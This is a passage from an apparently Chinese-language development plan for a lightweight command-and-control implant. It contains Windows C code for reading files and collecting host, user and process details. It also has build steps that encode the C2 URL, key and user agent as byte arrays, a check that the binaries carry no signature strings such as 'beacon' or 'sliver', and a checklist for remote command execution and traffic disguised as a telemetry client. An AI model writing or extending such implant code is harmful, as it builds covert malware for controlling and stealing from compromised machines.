    if (h == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        *err_code = (e == ERROR_FILE_NOT_FOUND || e == ERROR_PATH_NOT_FOUND) ? 1 : 2;
        return 0;
    }
    if (!GetFileSizeEx(h, &size) || size.QuadPart > FILE_CAP) {
        CloseHandle(h);
        *err_code = 3;
        return 0;
    }
    buf = (unsigned char *)malloc(size.QuadPart > 0 ? (size_t)size.QuadPart : 1);
    if (!buf) { CloseHandle(h); *err_code = 2; return 0; }
    while (total < (size_t)size.QuadPart) {
        DWORD rd = 0;
        if (!ReadFile(h, buf + total, (DWORD)((size_t)size.QuadPart - total), &rd, NULL) || rd == 0) break;
        total += rd;
    }
    CloseHandle(h);
    free(*out);
    *out = buf;
    *out_len = total;
    *err_code = 0;
    return 0;
}

void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid) {
    DWORD n;
    SYSTEM_INFO si;

    n = (DWORD)hn;
    if (!GetComputerNameExA(ComputerNameDnsHostname, hostname, &n)) hostname[0] = '\0';
    n = (DWORD)un;
    if (!GetUserNameA(username, &n)) username[0] = '\0';
    snprintf(os, on, "windows");
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) snprintf(arch, an, "amd64");
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) snprintf(arch, an, "arm64");
    else snprintf(arch, an, "unknown");
    *pid = (uint32_t)GetCurrentProcessId();
}
```

- [ ] **Step 2: 交叉编译验证**

```sh
cd implant/lite
# 临时 config.h（仅验证编译，验证后删除，不得提交）
cat > config.h <<'EOF'
#ifndef LITE_CONFIG_H
#define LITE_CONFIG_H
#define CFG_XOR 0x00
#define CFG_URL_LEN 34
static const unsigned char CFG_URL[34] = {0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x3a,0x38,0x34,0x34,0x33,0x2f,0x61,0x70,0x69,0x2f,0x76,0x32,0x2f,0x73,0x79,0x6e,0x63};
#define CFG_KEY_LEN 32
static const unsigned char CFG_KEY[32] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32};
#define CFG_JSON_KEY_LEN 4
static const unsigned char CFG_JSON_KEY[4] = {0x64,0x61,0x74,0x61};
#define CFG_UA_LEN 7
static const unsigned char CFG_UA[7] = {0x74,0x65,0x73,0x74,0x2d,0x75,0x61};
#define CFG_INTERVAL 180
#endif
EOF
chmod +x build.sh compile.sh
./build.sh windows
```

Expected: `dist/lite.exe` 产出，PE32+，体积约 20-60KB（`ls -la dist/lite.exe`）。

- [ ] **Step 3: 产物卫生检查**

```sh
ls -la dist/lite dist/lite.exe
strings dist/lite | grep -Ei 'litebeacon|beacon|implant|sliver' && echo "FAIL: 特征字符串" || echo "OK: linux 无特征字符串"
strings dist/lite.exe | grep -Ei 'litebeacon|beacon|implant|sliver' && echo "FAIL: 特征字符串" || echo "OK: windows 无特征字符串"
strings dist/lite dist/lite.exe | grep -E '127\.0\.0\.1:8443|api/v2/sync' && echo "FAIL: 明文配置泄露" || echo "OK: 配置已混淆"
file dist/lite dist/lite.exe
rm config.h && rm -rf dist
```

Expected: 全部 OK；linux 体积 < 40KB、windows < 80KB（超出则检查编译参数）。

- [ ] **Step 4: 提交**

```bash
git add implant/lite/win.c
git commit --no-verify -m "feat(lite): Windows 平台实现（WinHTTP + BCrypt）"
```

---

## 验收清单（对照设计文档）

- [ ] `./go-tests.sh --unit-only` 中 `server/litebeacon`、`server/web` 全绿
- [ ] e2e：Linux 版容器内上线 → exec 回传 marker → 读文件 → exit 退出
- [ ] 产物体积：linux ≤40KB、windows ≤80KB，strip 无符号
- [ ] `strings` 检查：无协议/框架特征词、无明文 C2 配置
- [ ] 外形自检：请求头集合（Accept/Accept-Language/UA 自洽遥测客户端）、体长随填充变化、GET/未知路径 nginx 风格 404、TLS 栈为 Schannel/OpenSSL
- [ ] 控制台：轻量信标页可启停监听、下载 config.h、签发新密钥、信标列表、排队任务、拉取结果
- [ ] Go 植入体生成链路零改动
